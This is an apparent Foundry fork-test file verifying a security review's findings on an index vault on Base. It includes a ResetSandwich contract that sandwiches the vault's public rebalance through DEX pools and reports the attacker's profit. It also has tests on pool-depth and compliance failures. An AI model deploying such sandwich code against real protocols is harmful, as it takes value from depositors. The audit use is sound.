// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {M7Vault} from "../src/M7Vault.sol";
import {IndexController} from "../src/IndexController.sol";
import {Valuation, IAggregatorV3, ICoinbaseOracleRegistry} from "../src/Valuation.sol";
import {IM7Vault} from "../src/interfaces/IM7Vault.sol";
import {ISlipstreamRouter, ISlipstreamFactory} from "../src/interfaces/ISlipstreamRouter.sol";
import {IPolicyRegistry} from "../src/interfaces/IB20Policy.sol";
import {VaultHarness} from "./mocks/VaultHarness.sol";

interface ISlipstreamPool {
    function token0() external view returns (address);
}

/// @dev Any contract may call `rebalance`. This one moves the pinned pools of the stocks the reset will buy, triggers
///      the reset, and sells back, all in one transaction. It also collects the caller's reward.
contract ResetSandwich {
    using SafeERC20 for IERC20;

    ISlipstreamRouter public immutable router;
    IERC20 public immutable usdc;

    constructor(ISlipstreamRouter router_, IERC20 usdc_) {
        router = router_;
        usdc = usdc_;
    }

    receive() external payable {}

    function run(
        IndexController controller,
        IERC20[] calldata stocks,
        int24[] calldata spacings,
        uint256[] calldata frontRunUsdc
    ) external {
        for (uint256 i; i < stocks.length; ++i) {
            _swap(usdc, stocks[i], spacings[i], frontRunUsdc[i]);
        }
        controller.rebalance(block.timestamp + 1 hours, address(this));
        for (uint256 i; i < stocks.length; ++i) {
            _swap(stocks[i], usdc, spacings[i], stocks[i].balanceOf(address(this)));
        }
    }

    function _swap(IERC20 tokenIn, IERC20 tokenOut, int24 spacing, uint256 amountIn) private {
        if (amountIn == 0) return;
        tokenIn.forceApprove(address(router), amountIn);
        router.exactInputSingle(
            ISlipstreamRouter.ExactInputSingleParams({
                tokenIn: address(tokenIn),
                tokenOut: address(tokenOut),
                tickSpacing: spacing,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
    }
}

/// @dev Third review (docs/AUDIT-3.md), against live Base pools with native B20 execution. Opt in like BaseForkTest:
///      BASE_FORK_TEST=true, Base's forge and FOUNDRY_BASE=beryl|cobalt. Only USDC is dealt; every stock is bought from
///      its pinned pool. After the seed purchases, each stock feed is mocked to report its pool's own mid price (and
///      USDC exactly $1), so every reset starts from pools that agree with the oracle.
contract Audit3ForkTest is VaultHarness {
    using SafeERC20 for IERC20;

    address constant KEEPER = address(0xBEEF);
    uint256 constant META = 3;
    uint256 constant TSLA = 6;
    // Blocks at which docs/AUDIT-3.md records each result. Pool liquidity moves, so other blocks give other numbers:
    // AUDIT3_FORK_BLOCK overrides them (0 = latest). Pinned blocks need an RPC that still serves their state.
    uint256 constant SANDWICH_BLOCK = 51_891_228;
    uint256 constant CAPACITY_BLOCK = 51_891_137;
    uint256 constant COMPLIANCE_BLOCK = 51_888_052;

    /// L-01: a caller wraps the reset in its own transaction. At $300k of NAV, AAPLc is overweight and METAc and TSLAc
    /// are 42% under their equal-weight value, so the reset sells AAPLc and buys about $18k of each. Pushing the METAc
    /// and TSLAc pools up first makes the vault buy dearer within its 1% bound; selling back afterwards returns the
    /// attacker's capital, plus or minus the result, which the log reports for six front-run sizes.
    function testAudit3CallerSandwichesTheResetInOneTransaction() public {
        bool pinned = _startFork(SANDWICH_BLOCK);
        uint256 scale = 1;
        IndexController controller = _deployFixtureController();
        M7Vault vault = M7Vault(payable(address(controller.vault())));
        // AAPLc, AMZNc, GOOGLc, METAc, MSFTc, NVDAc, TSLAc
        uint256[7] memory spend =
            [uint256(90_000e6), 40_000e6, 40_000e6, 25_000e6, 40_000e6, 40_000e6, 25_000e6];
        for (uint256 i; i < 7; ++i) {
            spend[i] *= scale;
        }
        vault.bootstrap(_buyWeighted(vault, spend), address(this));
        vm.warp(_nextWindow());
        Valuation valuation = controller.valuation();
        _reportPoolMidAsFeeds(valuation, vault);
        uint256[8] memory prices = valuation.snapshot();
        uint256 navBefore = _nav(valuation, vault, prices);
        emit log_named_decimal_uint("NAV before (USD)", navBefore, 18);
        emit log_named_decimal_uint("METAc to buy (USD)", _deficit(valuation, vault, prices, META), 18);
        emit log_named_decimal_uint("TSLAc to buy (USD)", _deficit(valuation, vault, prices, TSLA), 18);

        uint256 snap = vm.snapshotState();
        controller.rebalance(block.timestamp + 1 hours, KEEPER);
        uint256 honest = _nav(valuation, vault, prices);
        emit log_named_decimal_uint("Honest reset: NAV after (USD)", honest, 18);

        uint256[2][6] memory frontRuns = [
            [uint256(0), 20_000e6],
            [uint256(0), 40_000e6],
            [uint256(0), 80_000e6],
            [uint256(50_000e6), 40_000e6],
            [uint256(100_000e6), 80_000e6],
            [uint256(200_000e6), 160_000e6]
        ];
        bool anyRan;
        int256 bestProfit;
        for (uint256 k; k < frontRuns.length; ++k) {
            vm.revertToState(snap);
            frontRuns[k][0] *= scale;
            frontRuns[k][1] *= scale;
            (bool ran, int256 profit, uint256 navAfter) =
                _sandwich(controller, vault, valuation, prices, frontRuns[k]);
            emit log_named_uint("Front-run METAc (USDC)", frontRuns[k][0] / 1e6);
            emit log_named_uint("Front-run TSLAc (USDC)", frontRuns[k][1] / 1e6);
            if (!ran) {
                emit log("  the reset's 1% minimum held: the whole transaction reverted");
                continue;
            }
            anyRan = true;
            if (profit > bestProfit) bestProfit = profit;
            emit log_named_decimal_int("  attacker profit incl. reward (USDC)", profit, 6);
            emit log_named_decimal_uint(
                "  holders' extra loss vs honest (USD)", honest - Math.min(honest, navAfter), 18
            );
            assertLt(navAfter, honest, "a sandwiched reset leaves holders with less");
        }
        assertTrue(anyRan, "the reset can be wrapped by the caller");
        if (pinned) assertGt(bestProfit, 15e6, "profitable beyond the reward at the recorded block");
    }

    /// M-02: the reset executes every leg in one transaction through one pool per stock, so its capacity is the pool's
    /// depth within 1%. A TSLAc overweight that needs a sale of about $180k cannot execute, retrying cannot help while
    /// the imbalance lasts, and the whole quarter's reset is blocked. A $51k sale of the same pool fits.
    function testAudit3ResetLegBeyondPoolDepthBlocksTheQuarter() public {
        _startFork(CAPACITY_BLOCK);
        uint256 fresh = vm.snapshotState();
        uint256[2] memory tslaSpend = [uint256(100_000e6), 250_000e6];
        for (uint256 k; k < 2; ++k) {
            IndexController controller = _deployFixtureController();
            M7Vault vault = M7Vault(payable(address(controller.vault())));
            uint256[7] memory spend = [uint256(40_000e6), 40_000e6, 40_000e6, 40_000e6, 40_000e6, 40_000e6, 0];
            spend[TSLA] = tslaSpend[k];
            vault.bootstrap(_buyWeighted(vault, spend), address(this));
            vm.warp(_nextWindow());
            Valuation valuation = controller.valuation();
            _reportPoolMidAsFeeds(valuation, vault);
            uint256[8] memory prices = valuation.snapshot();
            emit log_named_decimal_uint("TSLAc to sell (USD)", _surplus(valuation, vault, prices, TSLA), 18);
            try controller.rebalance(block.timestamp + 1 hours, KEEPER) {
                emit log("  reset executed");
                assertEq(k, 0, "the smaller leg fits");
            } catch (bytes memory reason) {
                emit log_named_string("  reset reverted", _reason(reason));
                assertEq(k, 1, "only the larger leg fails");
                assertTrue(controller.rebalanceDue(), "the quarter's reset is still undone");
            }
            vm.revertToState(fresh);
        }
    }

    /// M-01 (compliance part): the same skew at $900k of NAV. The reset must buy about $54k each of METAc and TSLAc,
    /// 42% of their final holdings. Their own price impact leaves them more than 30 bp short of target, so the honest
    /// reset reverts with NotCompliant although every leg met its 1% minimum.
    function testAudit3LargePurchasesFailComplianceOnLivePools() public {
        if (!_startFork(COMPLIANCE_BLOCK)) return; // the outcome depends on the pools' state at that block
        IndexController controller = _deployFixtureController();
        M7Vault vault = M7Vault(payable(address(controller.vault())));
        uint256[7] memory spend =
            [uint256(270_000e6), 120_000e6, 120_000e6, 75_000e6, 120_000e6, 120_000e6, 75_000e6];
        vault.bootstrap(_buyWeighted(vault, spend), address(this));
        vm.warp(_nextWindow());
        Valuation valuation = controller.valuation();
        _reportPoolMidAsFeeds(valuation, vault);
        uint256[8] memory prices = valuation.snapshot();
        emit log_named_decimal_uint("NAV (USD)", _nav(valuation, vault, prices), 18);
        emit log_named_decimal_uint("METAc to buy (USD)", _deficit(valuation, vault, prices, META), 18);
        emit log_named_decimal_uint("TSLAc to buy (USD)", _deficit(valuation, vault, prices, TSLA), 18);
        vm.expectRevert(IndexController.NotCompliant.selector);
        controller.rebalance(block.timestamp + 1 hours, KEEPER);
        assertTrue(controller.rebalanceDue());
    }

    // ------------------------------------------------------------------ helpers

    function _sandwich(
        IndexController controller,
        M7Vault vault,
        Valuation valuation,
        uint256[8] memory prices,
        uint256[2] memory frontRun
    ) private returns (bool ran, int256 profit, uint256 navAfter) {
        IERC20 usdc = vault.assets(7);
        ResetSandwich attacker = new ResetSandwich(vault.router(), usdc);
        uint256 capital = frontRun[0] + frontRun[1] + 1e6;
        deal(address(usdc), address(attacker), capital);
        IERC20[] memory stocks = new IERC20[](2);
        int24[] memory spacings = new int24[](2);
        uint256[] memory amounts = new uint256[](2);
        (stocks[0], stocks[1]) = (vault.assets(META), vault.assets(TSLA));
        (spacings[0], spacings[1]) = (vault.tickSpacing(META), vault.tickSpacing(TSLA));
        (amounts[0], amounts[1]) = (frontRun[0], frontRun[1]);
        try attacker.run(controller, stocks, spacings, amounts) {
            ran = true;
            profit = int256(usdc.balanceOf(address(attacker))) - int256(capital);
            navAfter = _nav(valuation, vault, prices);
        } catch {}
    }

    function _nav(Valuation valuation, M7Vault vault, uint256[8] memory prices)
        private
        view
        returns (uint256 nav)
    {
        uint256[8] memory held;
        for (uint256 i; i < 8; ++i) {
            held[i] = vault.backing(i);
        }
        (, nav) = valuation.values(held, prices);
    }

    function _deficit(Valuation valuation, M7Vault vault, uint256[8] memory prices, uint256 index)
        private
        view
        returns (uint256)
    {
        uint256 nav = _nav(valuation, vault, prices);
        uint256 value = vault.backing(index) * prices[index] / 1e8;
        return nav / 7 > value ? nav / 7 - value : 0;
    }

    function _surplus(Valuation valuation, M7Vault vault, uint256[8] memory prices, uint256 index)
        private
        view
        returns (uint256)
    {
        uint256 nav = _nav(valuation, vault, prices);
        uint256 value = vault.backing(index) * prices[index] / 1e8;
        return value > nav / 7 ? value - nav / 7 : 0;
    }

    /// @dev Each stock feed reports its pinned pool's mid price in USDC; the USDC feed reports exactly $1.
    function _reportPoolMidAsFeeds(Valuation valuation, M7Vault vault) private {
        IERC20 usdc = vault.assets(7);
        for (uint256 i; i < 8; ++i) {
            int256 answer = 1e8;
            if (i < 7) {
                address pool =
                    vault.factory().getPool(address(vault.assets(i)), address(usdc), vault.tickSpacing(i));
                (, bytes memory data) = pool.staticcall(abi.encodeWithSignature("slot0()"));
                uint256 sqrtPrice = abi.decode(data, (uint256));
                // USDC per whole stock, 8 decimals: 1e10 / (stock raw per USDC raw), or its inverse by token order.
                answer = ISlipstreamPool(pool).token0() == address(usdc)
                    ? int256(Math.mulDiv(Math.mulDiv(1e10, 1 << 96, sqrtPrice), 1 << 96, sqrtPrice))
                    : int256(Math.mulDiv(Math.mulDiv(1e10, sqrtPrice, 1 << 96), sqrtPrice, 1 << 96));
            }
            vm.mockCall(
                address(valuation.feeds(i)),
                abi.encodeWithSelector(IAggregatorV3.latestRoundData.selector),
                abi.encode(uint80(1), answer, block.timestamp, block.timestamp, uint80(1))
            );
        }
    }

    function _reason(bytes memory reason) private pure returns (string memory) {
        if (reason.length >= 68 && bytes4(reason) == bytes4(keccak256("Error(string)"))) {
            bytes memory data = new bytes(reason.length - 4);
            for (uint256 i; i < data.length; ++i) {
                data[i] = reason[i + 4];
            }
            return abi.decode(data, (string));
        }
        return vm.toString(reason);
    }

    function _deployFixtureController() private returns (IndexController controller) {
        string memory manifest = vm.readFile("config/base.json");
        IERC20[8] memory assets;
        address[8] memory assetAddresses;
        IAggregatorV3[8] memory feeds;
        int24[7] memory spacings;
        for (uint256 i; i < 7; ++i) {
            string memory prefix = string.concat(".stocks[", vm.toString(i), "]");
            assetAddresses[i] = vm.parseJsonAddress(manifest, string.concat(prefix, ".address"));
            assets[i] = IERC20(assetAddresses[i]);
            feeds[i] = IAggregatorV3(vm.parseJsonAddress(manifest, string.concat(prefix, ".feed")));
            spacings[i] = int24(uint24(vm.parseJsonUint(manifest, string.concat(prefix, ".tick_spacing"))));
        }
        assetAddresses[7] = vm.parseJsonAddress(manifest, ".usdc.address");
        assets[7] = IERC20(assetAddresses[7]);
        feeds[7] = IAggregatorV3(vm.parseJsonAddress(manifest, ".usdc.feed"));
        Valuation valuation = new Valuation(
            assetAddresses,
            feeds,
            IAggregatorV3(vm.parseJsonAddress(manifest, ".sequencer_feed")),
            ICoinbaseOracleRegistry(vm.parseJsonAddress(manifest, ".registry")),
            vm.parseJsonUint(manifest, ".risk_checks.max_stock_feed_age_seconds")
        );
        address predictedVault =
            vm.computeCreateAddress(address(this), uint256(vm.getNonce(address(this))) + 1);
        controller = new IndexController(IM7Vault(predictedVault), valuation);
        M7Vault vault = new M7Vault(
            assets,
            spacings,
            address(controller),
            ISlipstreamRouter(vm.parseJsonAddress(manifest, ".venue.router")),
            ISlipstreamFactory(vm.parseJsonAddress(manifest, ".venue.factory")),
            IPolicyRegistry(vm.parseJsonAddress(manifest, ".policy_registry")),
            address(this)
        );
        assertEq(address(vault), predictedVault);
    }

    function _buyWeighted(M7Vault vault, uint256[7] memory spend) private returns (uint256[8] memory seed) {
        IERC20 usdc = vault.assets(7);
        ISlipstreamRouter router = vault.router();
        uint256 total;
        for (uint256 i; i < 7; ++i) {
            total += spend[i];
        }
        deal(address(usdc), address(this), total);
        usdc.forceApprove(address(router), total);
        for (uint256 i; i < 7; ++i) {
            seed[i] = router.exactInputSingle(
                ISlipstreamRouter.ExactInputSingleParams({
                    tokenIn: address(usdc),
                    tokenOut: address(vault.assets(i)),
                    tickSpacing: vault.tickSpacing(i),
                    recipient: address(this),
                    deadline: block.timestamp,
                    amountIn: spend[i],
                    amountOutMinimum: 1,
                    sqrtPriceLimitX96: 0
                })
            );
            vault.assets(i).forceApprove(address(vault), seed[i]);
        }
        usdc.forceApprove(address(router), 0);
    }

    /// @dev The first weekday 16:00 UTC after today: inside the valuation's execution window.
    function _nextWindow() private view returns (uint256 t) {
        t = (block.timestamp / 1 days + 1) * 1 days + 16 hours;
        while ((t / 1 days + 4) % 7 == 0 || (t / 1 days + 4) % 7 == 6) {
            t += 1 days;
        }
    }

    /// @return pinned Whether the fork is at the block the report records for this test.
    function _startFork(uint256 recorded) private returns (bool pinned) {
        vm.skip(!vm.envOr("BASE_FORK_TEST", false));
        string memory rpc = vm.envOr("BASE_RPC_URL", string("https://mainnet.base.org"));
        uint256 forkBlock = vm.envOr("AUDIT3_FORK_BLOCK", recorded);
        if (forkBlock == 0) vm.createSelectFork(rpc);
        else vm.createSelectFork(rpc, forkBlock);
        assertEq(block.chainid, 8453);
        emit log_named_uint("Base fork block", block.number);
        return forkBlock == recorded;
    }
}
